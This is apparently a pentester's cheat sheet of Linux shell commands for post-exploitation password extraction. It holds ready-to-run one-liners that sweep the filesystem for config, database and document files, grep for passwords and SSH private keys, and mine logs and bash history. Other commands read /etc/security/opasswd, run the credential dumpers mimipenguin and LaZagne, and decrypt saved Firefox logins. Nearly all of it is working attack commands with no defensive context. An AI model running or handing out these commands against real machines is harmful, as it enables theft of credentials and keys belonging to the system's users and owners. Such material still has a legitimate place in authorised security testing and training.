# Bash - Password extraction

% linux, password extraction

## find - Search for config files
```
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done
```

## grep - Find credentials in files
```
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "#";done
```

## find - Search for database files
```
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done
```

## find - Search for text files
```
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

## find - Search for script files
```
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share";done
```


## find - Search for document files
```
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core" ;done
```

## find - ssh private keys
```
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

## find - ssh pub keys
```
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

## find - log files
```
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

## View crontab contents
```
cat /etc/crontab
```

## List cron files
```
ls -la /etc/cron.*/
```

## Search for PRIVATE KEY
```
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

## Search for PRIVATE KEY in home
```
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

## Search for ssh-rsa keys
```
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

## View bash history
```
tail -n5 /home/*/.bash*
```

## Run Mimipenguin.py
```
python3 mimipenguin.py
```

## Run Mimipenguin.sh
```
bash mimipenguin.sh
```

## Run Lazagne.py
```
python2.7 lazagne.py all
```

## Search Firefox profiles
```
ls -l .mozilla/firefox/ | grep default
```

## View Firefox logins
```
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

## Decrypt Firefox credentials
```
python3.9 firefox_decrypt.py
```

## Run Lazagne browsers module
```
python3 lazagne.py browsers
```

## Opasswd - old password
```
sudo cat /etc/security/opasswd
```
